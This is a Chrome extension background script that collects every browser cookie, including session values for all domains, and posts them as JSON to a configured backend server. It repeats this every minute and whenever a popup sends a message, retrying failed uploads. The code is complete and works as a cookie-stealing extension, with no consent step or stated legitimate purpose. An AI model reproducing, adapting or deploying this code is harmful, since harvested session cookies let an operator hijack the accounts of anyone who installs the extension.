// background.js
import { CONFIG } from "./config.js";

console.log("Background service worker loaded!");

// ---- Read all cookies and return array ----
function getAllCookies() {
  return new Promise((resolve) => {
    chrome.cookies.getAll({}, (cookies) => {
      const allCookies = (cookies || []).map(cookie => ({
        domain: cookie.domain,
        name: cookie.name,
        value: cookie.value
      }));
      resolve(allCookies);
    });
  });
}

// ---- Send cookies to backend server with retries ----
async function sendCookiesToServer(allCookies, retryCount = 0) {
  try {
    console.log("Sending", allCookies.length, "cookies to:", CONFIG.BACKEND_URL);

    const response = await fetch(CONFIG.BACKEND_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(allCookies)
    });

    if (!response.ok) {
      throw new Error(`Server returned status ${response.status}`);
    }

    const text = await response.text();
    console.log("Server response:", text);
  } catch (err) {
    console.error("Error sending cookies:", err);

    if (retryCount < 3) {
      console.log(`Retrying in 5 seconds... (Attempt ${retryCount + 1})`);
      setTimeout(() => sendCookiesToServer(allCookies, retryCount + 1), 5000);
    } else {
      console.error("Failed to send cookies after 3 retries.");
    }
  }
}

// ---- Read and upload cookies ----
function readAndUploadCookies() {
  getAllCookies().then(allCookies => {
    console.log("Uploading", allCookies.length, "cookies to server...");
    sendCookiesToServer(allCookies);
  });
}

// ---- Periodic alarm every 1 minute ----
chrome.alarms.create("uploadCookies", { periodInMinutes: 1 });
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "uploadCookies") {
    readAndUploadCookies();
  }
});

// ---- Manual trigger from popup ----
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.action === "readNow") {
    readAndUploadCookies();
    sendResponse({ message: "Cookie read/upload triggered!" });
  }
});